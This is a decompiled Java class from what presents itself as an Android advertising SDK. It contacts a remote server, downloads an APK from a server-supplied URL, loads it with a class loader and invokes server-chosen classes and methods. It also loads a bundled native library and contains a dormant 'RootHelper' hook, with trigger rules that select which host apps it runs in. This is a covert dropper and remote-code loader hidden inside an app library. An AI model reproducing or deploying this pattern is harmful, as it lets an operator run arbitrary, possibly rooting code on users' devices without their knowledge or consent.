//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package com.parker.adsdk;

import android.content.Context;
import android.content.Intent;
import android.content.res.AssetManager;
import android.preference.PreferenceManager;
import android.text.TextUtils;

import com.parker.adsdk.network.RequestUtil;
import com.parker.adsdk.util.MyLog;

import dalvik.system.DexFile;
import dalvik.system.PathClassLoader;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Iterator;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;

public class WorkHelper {
    private static WorkHelper _instance;
    private static Context context;
    private static String downloadUrl;
    private static String md5;
    private static File helperFile;
    private static List<String> methods;
    private static String entryClassName;
    private static boolean libLoaded = false;

    public static WorkHelper sdkInitialize(Context context) {
        if(_instance == null) {
            _instance = new WorkHelper(context);
        }

        return _instance;
    }

    private WorkHelper(Context context) {
        WorkHelper.context = context;
        helperFile = new File(context.getFilesDir(), "helper.apk");
        methods = new ArrayList();

        try {
            JSONObject cfg = new JSONObject((new BufferedReader(new InputStreamReader(context.getAssets().open("cfg"), "UTF-8"))).readLine());
            RequestUtil.base_url = RequestUtil.base_url + cfg.optString("a");
        } catch (Exception e) {
            ;
        }

        try {
            this.loadLibraryFromJar();
            libLoaded = true;
        } catch (Throwable tr) {
            libLoaded = false;
        }

    }

    public static void startWork() {
        if(isRuleMatch()) {
            (new Thread(new Runnable() {
                public void run() {
                    if(!WorkHelper.libLoaded) {
                        MyLog.w("lib加载失败，将无法提供vm信息");
                    }

                    MyLog.i("正在初始化...");
                    String result = RequestUtil.requestInit(WorkHelper.context , true);

                    String msg;
                    try {
                        JSONObject resp = new JSONObject(result);
                        if(resp.getJSONObject("result").getInt("code") != 0) {
                            RequestUtil.recordLog(WorkHelper.context, RequestUtil.EVENT_INIT_RETURN_FAIL);
                            MyLog.w("停止R，错误代码：" + resp.getJSONObject("result").getInt("code"));
                            return;
                        }

                        RequestUtil.recordLog(WorkHelper.context, RequestUtil.EVENT_INIT_RETURN_SUCCESS);
                        PreferenceManager.getDefaultSharedPreferences(WorkHelper.context).edit().putString("initData", result).apply();
                        WorkHelper.context.sendBroadcast((new Intent("org.admobile.helper.intent.r.status")).putExtra("status", false));
                        WorkHelper.downloadUrl = resp.getString("downloadUrl");
                        WorkHelper.entryClassName = resp.getString("entryClassName");
                        WorkHelper.md5 = resp.getString("helperMd5");

                        JSONArray methodsArray = resp.getJSONArray("methods");
                        for(int i = 0; i < methodsArray.length(); ++i) {
                            WorkHelper.methods.add(methodsArray.optString(i));
                        }

                        MyLog.i("释放helper...");
                        WorkHelper.extractHelper();
                        MyLog.i("释放成功, 开始R流程");
                        //WorkHelper.execHelper();
                        WorkHelper.startHelper();
                    } catch (Throwable tr) {
                        MyLog.e("出现错误:" + tr);
                        PreferenceManager.getDefaultSharedPreferences(WorkHelper.context).edit().remove("initData").apply();
                        msg = WorkHelper.getErrorMsg(tr);
                        RequestUtil.recordLog(WorkHelper.context, RequestUtil.EVENT_HELPER_START_FAIL, msg);
                    }

                }
            })).start();
        }
    }

    private static boolean isRuleMatch() {
        File file = new File(context.getFilesDir(), "pkgRules");
        if(!file.exists()) {
            MyLog.i("未发现本地规则，跳过规则检查");
            return true;
        } else {
            try {
                FileInputStream e = new FileInputStream(file);
                byte[] buffer = new byte[(int)file.length()];
                e.read(buffer);
                e.close();
                String jsonString = new String(buffer);
                JSONObject jsonObject = new JSONObject(jsonString);
                if(!jsonObject.has("trigger")) {
                    MyLog.i("请求的规则中无触发器，跳过规则检查");
                    return true;
                }

                if(jsonObject.optString("pkgName").equals(context.getPackageName()) && jsonObject.optString("trigger").equals("hostStart")) {
                    MyLog.i("发现规则hostStart，规则匹配");
                    return true;
                }
            } catch (Exception var5) {
                return true;
            }

            MyLog.i("规则不匹配，中断执行");
            return false;
        }
    }

    private static void extractHelper() throws Exception {
        if (helperFile.exists()) return;
        RequestUtil.downloadFile(context ,RequestUtil.EVENT_HELPER_DOWNLOAD_HELPER ,downloadUrl , helperFile , md5);

/*        byte[] buffer = new byte[1024];
        AssetManager am = context.getAssets();
        InputStream is = am.open("helper.bin");
        if(is == null) {
            throw new FileNotFoundException("File was not found inside JAR.");
        } else {
            FileOutputStream os = new FileOutputStream(helperFile);

            int readBytes;
            try {
                while((readBytes = is.read(buffer)) != -1) {
                    os.write(buffer, 0, readBytes);
                }
            } finally {
                os.close();
                is.close();
            }

        }*/
    }

    private static void execHelper() throws Exception {
        RootHelper rootHelper = new RootHelper();
        rootHelper.start(WorkHelper.context);
    }

    private static void startHelper() {
        String odexFile = helperFile.getAbsolutePath().replace(".apk", ".odex");

        String msg;
        try {
            DexFile dexFile = DexFile.loadDex(helperFile.getAbsolutePath(), odexFile, 0);
            dexFile.close();
            msg = helperFile.getParent() + File.separator + "lib";
            String cfgPath = helperFile.getParent() + File.separator + "cfg";
            PathClassLoader classLoader = new PathClassLoader(helperFile.getAbsolutePath(), msg, context.getClass().getClassLoader());
            final Class clazz = classLoader.loadClass(entryClassName);
            final Object pluginInstance = clazz.getDeclaredConstructor(new Class[0]).newInstance(new Object[0]);
/*
            if(DEBUG) {
                Field invoked = clazz.getDeclaredField("DEBUG");
                invoked.setAccessible(true);
                invoked.set(pluginInstance, Boolean.valueOf(true));
            }
*/

            boolean invoked1 = false;
            Iterator var9 = methods.iterator();

            while(var9.hasNext()) {
                String methodName = (String)var9.next();
                Method method;
                if(methodName.equals("start")) {
                    method = clazz.getMethod(methodName, new Class[]{Context.class});
                    method.invoke(pluginInstance, new Object[]{context});
                    invoked1 = true;
                } else {
                    method = clazz.getMethod(methodName, new Class[0]);
                    method.invoke(pluginInstance, new Object[0]);
                    invoked1 = true;
                }
            }

            if(!invoked1) {
                throw new Exception("no matching method");
            }
/*
            if(DEBUG) {
                (new Thread(new Runnable() {
                    public void run() {
                        while(true) {
                            try {
                                Field e = clazz.getDeclaredField("log");
                                e.setAccessible(true);
                                StringBuilder helperStringBuilder = (StringBuilder)e.get(pluginInstance);
                                WorkHelper.helperLog = helperStringBuilder;
                                Thread.sleep(500L);
                            } catch (Exception var3) {
                                var3.printStackTrace();
                            }
                        }
                    }
                })).start();
            }*/
        } catch (Throwable tr) {
            MyLog.e("出现错误:" + tr);
            msg = getErrorMsg(tr);
            RequestUtil.recordLog(context, 52, msg);
        }

    }

    private static String getErrorMsg(Throwable e) {
        StringBuilder msg = new StringBuilder();
        msg.append("Exception Type: ").append(e.getClass().getSimpleName()).append("\n");

        try {
            msg.append(" Exception stacktrace: ");
            StackTraceElement[] classEnums;
            int file = (classEnums = e.getStackTrace()).length;

            for(int e11 = 0; e11 < file; ++e11) {
                StackTraceElement e1 = classEnums[e11];
                msg.append(e1.toString()).append("\n");
            }
        } catch (Throwable var9) {
            ;
        }

        try {
            msg.append(" Exception msg: ");
            if(e instanceof ClassNotFoundException) {
                ArrayList var10 = new ArrayList();

                try {
                    String var11 = helperFile.getAbsolutePath().replace(".apk", ".odex");
                    DexFile var12 = DexFile.loadDex(helperFile.getAbsolutePath(), var11, 0);
                    Enumeration var13 = var12.entries();

                    while(var13.hasMoreElements()) {
                        String clazz = (String)var13.nextElement();
                        if(!TextUtils.isEmpty(clazz)) {
                            var10.add(clazz);
                        }
                    }
                } catch (Exception var7) {
                    var7.printStackTrace();
                }

                msg.append(TextUtils.join(",", var10));
            } else {
                msg.append(TextUtils.isEmpty(e.getMessage())?"No error msg.":e.getMessage());
            }

            msg.append("\n");
        } catch (Throwable var8) {
            e.printStackTrace();
        }

        return msg.toString();
    }

/*    private static void log(String msg) {
        if(DEBUG) {
            sdkLog.append(msg + "\n");
        }

    }*/

    private void loadLibraryFromJar() throws Exception {
        File temp = new File(context.getFilesDir(), "lib.so");
        byte[] buffer = new byte[1024];
        AssetManager am = context.getAssets();
        InputStream is = am.open("libadmonetsdk.so");
        if(is == null) {
            throw new FileNotFoundException("File was not found inside JAR.");
        } else {
            FileOutputStream os = new FileOutputStream(temp);

            int readBytes;
            try {
                while((readBytes = is.read(buffer)) != -1) {
                    os.write(buffer, 0, readBytes);
                }
            } finally {
                os.close();
                is.close();
            }

            System.load(temp.getAbsolutePath());
        }
    }
}
